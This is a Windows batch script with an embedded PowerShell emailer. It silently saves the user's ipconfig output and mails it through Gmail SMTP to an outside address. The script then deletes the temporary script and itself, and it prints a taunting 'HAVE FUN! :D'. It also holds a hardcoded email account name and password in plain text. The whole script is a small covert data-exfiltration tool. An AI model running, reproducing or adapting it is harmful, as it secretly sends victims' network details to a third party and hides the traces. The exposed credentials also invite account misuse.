@echo off
REM echo off makes sure no code is printed to console
ipconfig > C:\Users\%username%\ipinfo.txt
SET GmailAccount=projdatatests@gmail.com
SET GmailPassword=C0D!N6PR0J3CT5
SET Attachment=C:\Users\%username%\ipinfo.txt
SET PShellScript=%temp%\sendEmail.ps1

CALL :PowerShellScriptCreate
CD %PowerShellDir%
Powershell -ExecutionPolicy Bypass -Command "& {%PShellScript% '%GmailAccount%' '%GmailPassword%' '%Attachment%'}"
@echo on
echo HAVE FUN! :D
@echo off
TIMEOUT /T 5
IF EXIST "%PShellScript%" DEL /Q /F "%PShellScript%"
IF EXIST "%~FN0" DEL /Q /F "%~FN0"
REM shutdown /r

:PowerShellScriptCreate
SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
SET PShellScript=%temp%\sendEmail.ps1
(
ECHO $Username      = $args[0]
ECHO $EmailPassword = $args[1]
ECHO $Attach    = $args[2]
ECHO $EmailTo     = "dogclemente@gmail.com"
ECHO $EmailFrom   = "projdatatests@gmail.com"
ECHO $Subject     = "IP Address Info CONF File"
ECHO $Body        = "See attachment for ip info"
ECHO $SMTPServer  = "smtp.gmail.com"
ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body^)
ECHO $SMTPMessage.Attachments.Add($Attach^)
ECHO $SMTPClient = New-Object System.Net.Mail.SmtpClient($SmtpServer, 587^)
ECHO $SMTPClient.EnableSsl = $true
ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword^)
ECHO $SMTPClient.Send($SMTPMessage^)
) > %PShellScript%
GOTO :EOF
